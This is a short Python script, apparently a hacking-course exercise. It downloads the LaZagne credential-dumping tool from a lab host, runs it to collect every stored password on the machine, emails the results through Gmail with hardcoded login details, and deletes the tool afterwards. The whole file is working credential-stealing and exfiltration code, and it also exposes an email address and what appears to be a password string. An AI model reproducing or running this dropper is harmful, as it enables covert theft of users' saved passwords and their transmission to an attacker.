#!/usr/bin/env python
#This program downloads a file, executes it and sends a 
#report via email


import requests,subprocess,smtplib,os,tempfile

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    #wb mode for writing a binary file
    with open(file_name, "wb") as file:
        file.write(get_response.content)

def send_mail(email, password, message):
    smtp_server = smtplib.SMTP("smtp.gmail.com",587)
    smtp_server.starttls()
    smtp_server.login(email,password)
    smtp_server.sendmail(email, email, message)
    smtp_server.quit()

temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)

download("http://10.0.2.7/evil-files/laZagne.exe")
command = "laZagne.exe all"
result = subprocess.check_output(command, shell=True)
send_mail("pauloclmatos@gmail.com","C4B77E61D94856CDE0147B27C100ACFAC09FE20D8D882043EE5E9554855D8342",result)
os.remove("laZagne.exe")